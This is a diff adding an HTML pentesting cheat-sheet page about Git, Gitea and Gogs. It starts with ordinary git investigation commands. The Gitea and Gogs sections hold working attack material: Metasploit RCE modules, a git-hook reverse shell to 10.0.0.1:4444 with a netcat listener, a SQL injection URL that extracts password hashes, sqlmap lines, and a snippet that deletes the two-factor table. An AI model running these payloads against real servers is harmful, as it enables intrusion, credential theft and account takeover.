@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Create Git Local Server - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Create Git Local Server", url: "#_top", children: [
+              {title: "Start Local Git Server (Dumb, HTTP)", url: "#start-local-git-server-dumb-http" },
+          ]},
+          {title: "Git GitHub Pentesting", url: "#git-github-pentesting", children: [
+              {title: "Git Commands for the Repository Investigation", url: "#git-commands-for-the-repository-investigation" },
+          ]},
+          {title: "Local Git server sync commands", url: "#local-git-server-sync-commands", children: [
+          ]},
+          {title: "Gitea Pentesting", url: "#gitea-pentesting", children: [
+              {title: "Common Directories", url: "#common-directories" },
+              {title: "Investigation", url: "#investigation" },
+              {title: "Git Fetch Remote Code Execution (RCE)", url: "#git-fetch-remote-code-execution-rce" },
+              {title: "Git Hooks Remote Code Execution (RCE)", url: "#git-hooks-remote-code-execution-rce" },
+              {title: "Swagger API", url: "#swagger-api" },
+              {title: "Delete the Two-Factor", url: "#delete-the-two-factor" },
+          ]},
+          {title: "Gogs Pentesting", url: "#gogs-pentesting", children: [
+              {title: "SQL injection (CVE-2014-8682)", url: "#sql-injection-cve-2014-8682" },
+              {title: "Git Hooks Remote Code Execution (RCE)", url: "#git-hooks-remote-code-execution-rce_1" },
+              {title: "GitHub Dorks", url: "#github-dorks" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="create-git-local-server">Create Git Local Server</h1>
+<div class="language-text highlight"><pre><span></span><code>- [git-scm](https://git-scm.com/book/en/v2/Git-Internals-Transfer-Protocols)
+</code></pre></div>
+<h2 id="start-local-git-server-dumb-http">Start Local Git Server (Dumb, HTTP)</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cd test_repo
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>git init
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>git add . &amp;&amp; git commit -m &quot;first commit&quot;
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>cd .git
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a># Update auxiliary info file to help dumb server.
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a># --bare: Bare repository (does not have a working directory)
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>git --bare update-server-info
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>cd ..
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>python3 -m http.server
+</span></code></pre></div>
+<h1 id="git-github-pentesting">Git GitHub Pentesting</h1>
+<p>Git is software for tracking changes in any sets of files. It’s also used with GitHub usually.</p>
+<h2 id="git-commands-for-the-repository-investigation">Git Commands for the Repository Investigation</h2>
+<h3 id="check-information">Check Information</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Basic information</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>git<span class="w"> </span>show
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>git<span class="w"> </span>show<span class="w"> </span>&lt;branch-name&gt;
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>git<span class="w"> </span>show<span class="w"> </span>&lt;commit-id&gt;
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>git<span class="w"> </span>show<span class="w"> </span>&lt;tag-name&gt;
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>git<span class="w"> </span>--git-dir<span class="w"> </span>/path/to/.git<span class="w"> </span>show
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># Configuration</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>git<span class="w"> </span>config<span class="w"> </span>--list
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="c1"># Commit history</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>git<span class="w"> </span>log
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>git<span class="w"> </span>log<span class="w"> </span>--stat
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>git<span class="w"> </span>--git-dir<span class="w"> </span>/path/to/.git<span class="w"> </span>log<span class="w"> </span>--stat
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="c1"># Compare the two commits</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>git<span class="w"> </span>diff
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>git<span class="w"> </span>diff<span class="w"> </span>--staged
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>git<span class="w"> </span>diff<span class="w"> </span>--cached
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="c1"># Working tree status</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>git<span class="w"> </span>status
+</span></code></pre></div>
+<h3 id="back-to-the-previous-commits">Back to the Previous Commits</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># You can get the &quot;commit-id&quot; by &#39;git log&#39;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>git<span class="w"> </span>checkout<span class="w"> </span>&lt;commit-id&gt;
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>git<span class="w"> </span>--git-dir<span class="w"> </span>/path/to/.git<span class="w"> </span>checkout<span class="w"> </span>&lt;commit-id&gt;
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c1"># Return the recent commit</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>git<span class="w"> </span>checkout<span class="w"> </span>master
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>git<span class="w"> </span>checkout<span class="w"> </span>main
+</span></code></pre></div>
+<h3 id="search-the-other-branches">Search the Other Branches</h3>
+<p>For getting all branches.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>git<span class="w"> </span>branch<span class="w"> </span>-a
+</span></code></pre></div>
+<p>Btw, for creating a new branch.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>git<span class="w"> </span>branch<span class="w"> </span>new-branch
+</span></code></pre></div>
+<h3 id="clone-the-repository">Clone the Repository</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/username/repo.git
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># via SSH</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>git<span class="w"> </span>clone<span class="w"> </span>ssh://git-user@10.0.0.1/path/to/repo
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>git<span class="w"> </span>clone<span class="w"> </span>ssh://git-user@10.0.0.1/path/to/repo.git
+</span></code></pre></div>
+<h3 id="find-tags">Find Tags</h3>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># List tags</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>git<span class="w"> </span>tag
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>git<span class="w"> </span>tag<span class="w"> </span>-l
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># Show the contents of the specific tag</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>git<span class="w"> </span>show<span class="w"> </span>&lt;tag-name&gt;
+</span></code></pre></div>
+<h3 id="restore-deleted-files">Restore Deleted Files</h3>
+<p>First off, check deleted files.</p>
+<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>git<span class="w"> </span>status
+</span></code></pre></div>
+Then restore them.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>git<span class="w"> </span>restore<span class="w"> </span>&lt;a-deleted-file&gt;
+</span></code></pre></div>
+<h1 id="local-git-server-sync-commands">Local Git server sync commands</h1>
+<ul>
+<li>
+<p>Commiting code to your local Git server</p>
+<ul>
+<li>It is recommended to get TLS/SSL working</li>
+<li>Make sure to change</li>
+</ul>
+</li>
+<li>
+<p><code>&lt;domain&gt;</code></p>
+</li>
+<li><code>&lt;username&gt;</code></li>
+<li><code>&lt;email&gt;</code></li>
+<li><code>&lt;commit_message&gt;</code></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>git -c http.sslVerify=false clone http://git.&lt;domain&gt;/&lt;username&gt;/scripts.git
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>git config --global user.email &quot;&lt;email&gt;&quot; &amp;&amp; git config --global user.name &quot;&lt;username&gt;&quot;
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>git commit &quot;&lt;commit_message&gt;&quot;
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>git -c http.sslVerify=false push
+</span></code></pre></div>
+<h1 id="gitea-pentesting">Gitea Pentesting</h1>
+<p>Gitea is a forge software package for hosting software development version control using Git.</p>
+<h2 id="common-directories">Common Directories</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>/api/swagger
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>/api/v1/repos/search?q=test
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>/api/v1/users/search?q=test
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>/api/v1/users/&lt;username&gt;/repos
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>/explore/organizations
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>/explore/repos
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>/explore/users
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a># OAuth
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>/.well-known/openid-configuration
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>/login/oauth/authorize
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>/login/oauth/access_token
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>/login/oauth/userinfo
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>/login/oauth/keys
+</span></code></pre></div>
+<h2 id="investigation">Investigation</h2>
+<h3 id="repositories">Repositories</h3>
+<p>If we can access to repositories, we might be able to find sensitive information e.g. credentials, subdomains, other domains, secret keys, etc.<br />
+So check the source code.</p>
+<h3 id="get-secrets-in-web-hooks">Get Secrets in Web Hooks</h3>
+<p>In the existing repository, we may find the secret value in the <strong>repository → Settings → Web Hooks</strong>.</p>
+<h3 id="find-user-credentials">Find User Credentials</h3>
+<p>If we have access to the target system and the repository, that is pushed in Gitea, exists in the system, we might be able to find the credential.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">cd</span><span class="w"> </span>/path/to/gitea/repo
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>git<span class="w"> </span>config<span class="w"> </span>-l
+</span></code></pre></div>
+<h2 id="git-fetch-remote-code-execution-rce">Git Fetch Remote Code Execution (RCE)</h2>
+<h3 id="metasploit">Metasploit</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>msfconsole
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>msf&gt; use exploit/multi/http/gitea_git_fetch_rce
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>msf&gt; (set options)
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>msf&gt; run
+</span></code></pre></div>
+<h2 id="git-hooks-remote-code-execution-rce">Git Hooks Remote Code Execution (RCE)</h2>
+<p><a href="https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce">CVE-2020-14144</a><br />
+It affects Gitea version from 1.1.0 to 1.13.</p>
+<h3 id="1-login">1. Login</h3>
+<p>Access to the Gitea dashboard and login as the existing account.</p>
+<h3 id="2-create-a-new-repository">2. Create a New Repository</h3>
+<h3 id="3-go-to-the-repositorys-settings">3. Go to the Repository’s Settings</h3>
+<p>In the new repository we’ve created, go to <strong>Settings → Git Hooks → post-receive</strong>.</p>
+<h3 id="4-update-to-the-reverse-shell-payload">4. Update to the Reverse Shell Payload</h3>
+<p>In the post-receive edit page, inject the payload as below:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>#!/bin/bash
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444
+</span></code></pre></div>
+<h3 id="5-start-listener-in-terminal">5. Start Listener in Terminal</h3>
+<p>To receive the outcoming connection of the git hook, start listener.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nc -lvnp 4444
+</span></code></pre></div>
+<h3 id="6-create-the-new-repository-in-terminal">6. Create the New Repository in Terminal</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>mkdir test
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>cd test
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>touch README.md
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>git init
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>git add README.md
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>git commit -m &quot;first commit&quot;
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>git remote add origin https://&lt;target-ip&gt;/&lt;username&gt;/test.git
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>git push -u origin master
+</span></code></pre></div>
+<p>After pushing, git hook triggered and execute the reverse shell command.<br />
+Now we should get a shell.</p>
+<h2 id="swagger-api">Swagger API</h2>
+<p>We can access to <strong><code>/api/swagger</code></strong> to interact with <strong>Swagger API</strong>.</p>
+<h3 id="get-new-token-authorize">Get New Token &amp; Authorize</h3>
+<p>We need a token to use Swagger API.</p>
+<ol>
+<li>Register a new account in Gitea top page.</li>
+<li>Go to <strong><code>/user/settings/applications</code></strong> and generate a new token.</li>
+<li>Copy the token value e.g. “fa2c2428817d64c1b890d404a905f7be2ffd4bde”.</li>
+<li>Go to <strong><code>/api/swagger</code></strong>.</li>
+<li>Click “Authorize” button. The modal window opens.</li>
+<li>Paste the token in the “Token” section.</li>
+</ol>
+<h2 id="delete-the-two-factor">Delete the Two-Factor</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>victim@machine:/gitea/gitea$<span class="w"> </span>python3
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>&gt;&gt;&gt;<span class="w"> </span>import<span class="w"> </span>sqlite3
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>&gt;&gt;&gt;<span class="w"> </span><span class="nv">conn</span><span class="o">=</span>sqlite3.connect<span class="o">(</span><span class="s1">&#39;gitea.db&#39;</span><span class="o">)</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>&gt;&gt;&gt;<span class="w"> </span>conn.execute<span class="o">(</span><span class="s1">&#39;delete from two_factor&#39;</span><span class="o">)</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>&gt;&gt;&gt;<span class="w"> </span>conn.commit<span class="o">()</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>&gt;&gt;&gt;<span class="w"> </span>conn.close<span class="o">()</span>
+</span></code></pre></div>
+<h1 id="gogs-pentesting">Gogs Pentesting</h1>
+<p>Gogs (Go Git Service) is a painless self-hosted Git Service.</p>
+<h2 id="sql-injection-cve-2014-8682">SQL injection (<a href="https://www.exploit-db.com/exploits/35238">CVE-2014-8682</a>)</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>http://127.0.0.1:3000/api/v1/users/search?q=&#39;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--
+</span></code></pre></div>
+<h3 id="automation">Automation</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sqlmap -u &quot;https://example.com/api/v1/repos/search?q=test&quot;
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>sqlmap -u &quot;https://example.com/api/v1/users/search?q=test&quot;
+</span></code></pre></div>
+<h2 id="git-hooks-remote-code-execution-rce_1">Git Hooks Remote Code Execution (RCE)</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>msfconsole
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>msf&gt; use exploit/multi/http/gogs_git_hooks_rce
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>msf&gt; (set options...)
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>msf&gt; run
+</span></code></pre></div>
+<h2 id="github-dorks">GitHub Dorks</h2>
+<h3 id="search-target-repository">Search Target Repository</h3>
+<p>You may be able to get the desired repository by searching in the Google.  </p>
+<p>The searching word is like "<target-name> github".</p>
+<h3 id="find-sensitive-data-in-the-repository">Find Sensitive Data in the Repository</h3>
+<p>If you can access to the GitHub repository, research files and find the sensitive information. For example:</p>
+<ul>
+<li>Hard-coded contents</li>
+<li>Past commits</li>
+<li>Deleted files in past commits</li>
+<li>Commit messages</li>
+<li>Email address which may leak sensitive information about personal accounts</li>
+<li>Different branches</li>
+</ul>
+<p>For more details, see the <a href="https://github.com/techgaun/github-dorks">github-dorks</a>{:target="_blank"}{:rel="noopener"}.</p>
+<h3 id="find-email-address">Find Email Address</h3>
+<ol>
+<li>Click the target repository.</li>
+<li>Move to the commit history.</li>
+<li>
+<p>Click the commit and add “.patch” to the URL. For example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>https://github.com/&lt;username&gt;/&lt;repository&gt;/commit/d4...ff54.patch
+</span></code></pre></div>
+</li>
+<li>
+<p>Check the “From” section in the page. You should find the email address of the commiter.</p>
+</li>
+</ol>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/versioncontrol.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
